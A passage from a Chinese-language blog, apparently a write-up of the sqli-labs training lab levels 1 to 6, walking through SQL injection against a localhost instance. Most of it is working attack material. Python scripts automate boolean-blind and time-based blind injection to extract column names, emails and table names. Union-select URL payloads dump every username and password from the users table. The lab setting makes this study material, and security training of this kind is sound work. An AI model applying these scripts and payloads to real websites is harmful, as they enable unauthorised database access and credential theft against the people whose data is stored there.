<p><img src="https://i.loli.net/2018/02/18/5a898f172d993.jpg" alt=""><br>现在获取到表名：email,referer,uagent,user，所以毫无疑问，需要的用户名以及账号信息都在user表里面，所以下一步需要开始查列。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+payload</span><br><span class="line">	content=requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">		payload=<span class="string">"and (select length(column_name) from information_schema.columns where table_name=0x75736572 limit "</span>+str(i)+<span class="string">",1)="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">		recv=send_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="keyword">print</span> j</span><br><span class="line">			<span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		column_length=get_column_length(i)</span><br><span class="line">		<span class="keyword">if</span> column_length != <span class="keyword">None</span>:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(column_length+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">122</span>):</span><br><span class="line">					payload=<span class="string">"and ascii(substr((select column_name from information_schema.columns where table_name=0x75736572 limit "</span>+str(i)+<span class="string">",1),"</span>+str(j)+<span class="string">",1))="</span>+str(k)+<span class="string">"%23"</span></span><br><span class="line">					recv=send_data(payload)</span><br><span class="line">					<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">						result+=chr(k)</span><br><span class="line">						<span class="keyword">print</span> result</span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_column_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p>查到需要的列以后我就把程序暂停了…OK，看图。<br><img src="https://i.loli.net/2018/02/18/5a89a26af051a.jpg" alt=""><br>现在需要获取列的内容，不过昨天跑出来的列似乎有点问题，并且我测试的时候还提示我user这个表不存在，所以这里使用emails表的email_id来进行测试。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+payload</span><br><span class="line">	content=requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dump_length</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and (select length(email_id) from emails limit "</span>+str(i)+<span class="string">",1)="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">		recv=get_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="keyword">print</span> payload</span><br><span class="line">			<span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dump_name</span><span class="params">()</span>:</span></span><br><span class="line">	chars=<span class="string">".1234567890@abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		dump_length=get_dump_length(i)</span><br><span class="line">		<span class="keyword">if</span> dump_length != <span class="keyword">None</span>:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(dump_length+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">for</span> k <span class="keyword">in</span> chars:</span><br><span class="line">					payload=<span class="string">"and ascii(substr((select email_id from emails limit "</span>+str(i)+<span class="string">",1),"</span>+str(j)+<span class="string">",1))="</span>+str(ord(k))+<span class="string">"%23"</span></span><br><span class="line">					recv=get_data(payload)</span><br><span class="line">					<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">						result+=k</span><br><span class="line">						<span class="comment">#print result</span></span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">print</span> result</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_dump_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/19/5a8a785e5cadd.jpg" alt=""><br>现在可以获取到相关列的内容，但是我觉得这样写，运行结果的时候耗费的时间有点长，所以我打算用多线程的方式来改进一下。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def send_data(payload):</span><br><span class="line">	<span class="attribute">url</span>=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+payload</span><br><span class="line">	<span class="attribute">content</span>=requests.get(url).text</span><br><span class="line">	return content</span><br><span class="line"></span><br><span class="line">def get_dump_length(i):</span><br><span class="line">	<span class="attribute">payload</span>=<span class="string">"and (select length(email_id) from emails limit &#123;0&#125;,1)=&#123;1&#125;"</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(0,20):</span><br><span class="line">		<span class="attribute">payload</span>=payload.format(i,j)</span><br><span class="line">		<span class="attribute">recv</span>=send_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="builtin-name">print</span> payload</span><br><span class="line">			return j</span><br><span class="line"></span><br><span class="line">def get_dump():</span><br><span class="line">	<span class="attribute">chars</span>=<span class="string">".1234567890@abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">	<span class="attribute">payload</span>=<span class="string">"and ascii(substr((select email_id from emails limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(0,20):</span><br><span class="line">		<span class="attribute">dump_length</span>=get_dump_length(i)</span><br><span class="line">		<span class="attribute">result</span>=<span class="string">""</span></span><br><span class="line">		<span class="keyword">if</span> dump_length != None:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(dump_length+1):</span><br><span class="line">				<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">					<span class="attribute">payload</span>=payload.format(i,j,char)</span><br><span class="line">					<span class="attribute">recv</span>=send_data(payload)</span><br><span class="line">					<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">						result+=char</span><br><span class="line">						<span class="builtin-name">print</span> result</span><br><span class="line">						break</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	<span class="attribute">threadNum</span>=10</span><br><span class="line">	threads=[]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(threadNum):</span><br><span class="line">		<span class="attribute">t</span>=threading.Thread(target=get_dump)</span><br><span class="line">		t.start()</span><br><span class="line">		threads.append(t)	</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">		i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attribute">__name__</span>=="__main__":</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p>这样大概能稍微快一些。</p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p><img src="https://i.loli.net/2018/02/19/5a8a763471edc.jpg" alt=""><br>首先是测试注入，加入单引号以后没有变化，但是测试双引号测试成功，所以这题使用双引号进行注入，同Less-5所有的脚本一样，所以这题还是盲注，Less-5使用的是布尔盲注，所以这道题我准备用时间盲注来做。<br>这里讲一下基于时间注入的相关语法：<br>①if()语句：<br>if(e1,e2,e3)，如果e1为true，则执行e2，否则执行e3；<br>②sleep():<br>sleep(延迟时间)，比如sleep(5)，延迟5s；<br>③BENCHMARK():<br>BENCHMARK(count,expr),重复地执行表达式expr一共count次；<br>看的时候觉得BENCHMARK有点繁琐，所以后面就没有使用BENCHMARK。<br>首先我们使用延时注入来查询当前数据库的长度，if((),1,sleep(5))，意思就是如果当前数据库的长度为true，就直接返回结果，否则就延时5s。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-6/?id=1%22 "</span>+payload</span><br><span class="line">	recv=requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> recv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_length</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and if(length(database())="</span>+str(i)+<span class="string">",1,sleep(1))%23"</span></span><br><span class="line">		<span class="comment">#这里只需要对当前数据库进行测试</span></span><br><span class="line">		recv=send_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"The length of database is "</span>,i</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">	chars=<span class="string">".1234567890@abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	db_length=get_db_length()</span><br><span class="line">	<span class="keyword">if</span> db_length != <span class="keyword">None</span>:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(db_length+<span class="number">1</span>):</span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				payload=<span class="string">"and if(ascii(substr(database(),"</span>+str(j)+<span class="string">",1))="</span>+str(ord(char))+<span class="string">",1,sleep(2))%23"</span></span><br><span class="line">				recv=send_data(payload)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">					result+=char</span><br><span class="line">					<span class="comment">#print result</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_db_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p>由于延时的原因，这里出结果出得有点慢…大概耐心等一下？（撑脸）最后结果测试出数据库名称为security。<br>拿到数据库名称，下面的步骤就和Less-5一样了，所以下面就只写出表的注入过程了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-6/?id=1%22 "</span>+payload</span><br><span class="line">	recv=requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> recv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(j)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and if((select length(table_name) from information_schema.tables where table_schema=database() limit "</span>+str(j)+<span class="string">",1)="</span>+str(i)+<span class="string">",1,sleep(2))%23"</span></span><br><span class="line">		recv=send_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"The length of table is "</span>,i</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">	chars=<span class="string">".1234567890@abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		db_length=get_table_length(i)</span><br><span class="line">		<span class="keyword">if</span> db_length != <span class="keyword">None</span>:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(db_length+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">					payload=<span class="string">"and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1),"</span>+str(j)+<span class="string">",1))="</span>+str(ord(char))+<span class="string">",1,sleep(2))%23"</span></span><br><span class="line">					recv=send_data(payload)</span><br><span class="line">					<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">						result+=char</span><br><span class="line">						<span class="comment">#print result</span></span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_db_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p>后面的大同小异，但是写了这些脚本以后我发现…数据库的表是从1开始计算的，所以最后获取长度以后要+1处理。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/19/sqlilabs-Less-5~6/" data-id="cjk0t3ven00169cv4kt1pt76z" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-injection/">SQL_injection</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sqlilab-wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/17/sqlilab-wp/" class="article-date">
  <time datetime="2018-02-16T16:22:45.000Z" itemprop="datePublished">2018-02-17</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞学习/">漏洞学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/17/sqlilab-wp/">sqlilabs Less-1~Less-4 writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p><img src="https://i.loli.net/2018/02/17/5a87c6e88c59b.jpg" alt=""><br>根据提示对id这个参数进行测试，<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/?id=1'</span></span><br></pre></td></tr></table></figure></p>
<p>页面报错<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure></p>
<p>注意到LIMIT0,1后面多了一个’，所以构造下面语句来猜测列数<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">1</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>测试到第四列的时候显示Unknown column ‘4’ in ‘order clause’，所以只有三列，然后显列<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/?id=-1' union select 1,2,3%23</span></span><br></pre></td></tr></table></figure></p>
<p>显示的列数在2,3两列，所以测试数据库<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/?id=-1' union select 1,database(),3%23</span></span><br></pre></td></tr></table></figure></p>
<p>数据库名为security,对数据库名进行hex编码7365637572697479,爆表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x7365637572697479</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>爆出表名为：emails,referers,uagents,users，下面开始爆列,这里使用users表，进行hex编码：7573657273<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x7573657273</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>OK,这里列名出来了：id,username,password，现在取数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>这样就能获取所有的账号和密码。</p>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p><img src="https://i.loli.net/2018/02/19/5a8a70a5ce4fd.jpg" alt=""><br>测试sql，加上单引号，测试成功，开始注入，测试列数<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">2</span>/?<span class="attr">id=</span><span class="number">1</span> <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>同上，只有三列，下面开始显列<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost/sqli</span>-labs-master/Less-<span class="number">2</span>/?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3%23</span></span><br></pre></td></tr></table></figure></p>
<p>列数爆出来是2,3，现在查数据库<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost/sqli</span>-labs-master/Less-<span class="number">2</span>/?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">database</span>(),3%23</span></span><br></pre></td></tr></table></figure></p>
<p>emmmm数据库查出来还是security，所以下面操作同上，爆表爆列拿数据。<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost/sqli</span>-labs-master/Less-<span class="number">2</span>/?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">group_concat</span>(<span class="title">username</span>,0<span class="title">x3a</span>,<span class="title">password</span>),3 <span class="title">from</span> <span class="title">users</span>%23</span></span><br></pre></td></tr></table></figure></p>
<p>OK，拿到所有账号密码。</p>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p><img src="https://i.loli.net/2018/02/19/5a8a70a621663.jpg" alt=""><br>首先，还是进行sql注入测试，先上单引号，不过这次有点有趣，它报错报的是<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure></p>
<p>所以这次是括号闭合加单引号闭合，测试列数如下<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">3</span>/?<span class="attr">id=</span><span class="number">1</span>') <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>找到拼接字符以后就和Less-1步骤一样，最后拿到所有数据的payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-3/?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
